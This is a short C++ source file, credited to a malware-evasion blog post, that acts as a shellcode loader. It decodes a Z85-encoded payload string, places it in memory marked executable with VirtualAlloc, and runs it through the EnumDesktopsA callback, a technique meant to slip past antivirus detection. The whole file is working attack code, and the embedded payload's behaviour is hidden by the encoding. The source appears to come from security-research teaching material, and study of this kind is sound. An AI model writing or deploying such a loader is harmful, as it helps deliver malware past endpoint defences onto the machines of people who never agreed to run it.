/*
hack.cpp
Z85 encode payload
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/07/30/malware-av-evasion-8.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <./z85.h>
#include <./z85.c>
#include <windows.h>

int main(int argc, char* argv[]) {
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  char e_my_payload[] = "2@78z1[C&K*>*fqf06%EFp/pd>nhnL7nq*wNk1HPf7^pGGqxOd]I/ISTndSg4n>?4Znhm]YjyJQsefEl{:QHJp.q:&Wk#x*pI=7VYI:xJ%0NK2*Fqsg907.*VBz<XJ=}(]:neKJUI:eyR0NP>inDl^}l5NNQncdpog08%vZ]P&r:QHJp.8Qv}[JGRGoE6)jiNJ02suYchkQn]4=$kEcIWScum2KqInDEg4l5L(4ncd76sv34}sZ19[l0lGSnq3mKk#N:vsv37[k1HOA>$g{P%6njp.2KDn06S@kL]oV606T8oG^u:107X&^laPHqrTnVPYwKXV3phn2Ma-:*!KUthc{dYY3v@3iBP]xE6ln2a09IQA*w/X$wP8=AzdNTfaPKVie?QD[00000";
  char d_my_payload[314] = {};
  size_t d = Z85_decode_with_padding(e_my_payload, d_my_payload, strlen(e_my_payload));
  LPVOID mem = VirtualAlloc(NULL, sizeof(d_my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, d_my_payload, sizeof(d_my_payload));
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, 0);
  return 0;
}
